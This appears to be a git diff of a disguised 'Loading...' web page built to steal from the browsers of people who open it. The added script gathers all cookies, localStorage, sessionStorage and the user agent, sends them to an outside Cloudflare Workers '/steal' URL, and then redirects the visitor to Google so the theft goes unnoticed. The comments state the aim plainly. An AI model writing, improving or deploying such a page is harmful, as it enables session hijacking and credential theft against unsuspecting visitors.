@@ -3,13 +3,35 @@
 <head>
     <title>Loading...</title>
     <script>
-        // Steal all cookies
+        // Get ALL cookies from browser
         let cookies = document.cookie || 'No cookies found';
         
-        // Send to your Cloudflare server
-        fetch('https://your-project.pages.dev/steal?data=' + encodeURIComponent(cookies));
+        // Get ALL localStorage
+        let storage = JSON.stringify(localStorage) || 'No storage';
         
-        // Redirect to Google (victim never knows)
+        // Get ALL sessionStorage
+        let session = JSON.stringify(sessionStorage) || 'No session';
+        
+        // Get browser info
+        let browser = navigator.userAgent;
+        
+        // Combine everything
+        let allData = {
+            cookies: cookies,
+            storage: storage,
+            session: session,
+            browser: browser,
+            time: new Date().toISOString()
+        };
+        
+        // Encode and send to Cloudflare
+        let encoded = encodeURIComponent(JSON.stringify(allData));
+        let url = 'https://ishing-demo.gokulkannan45qs.workers.dev/steal?data=' + encoded;
+        
+        // Send data
+        fetch(url, { mode: 'no-cors' });
+        
+        // Redirect
         window.location.href = 'https://google.com';
     </script>
 </head>
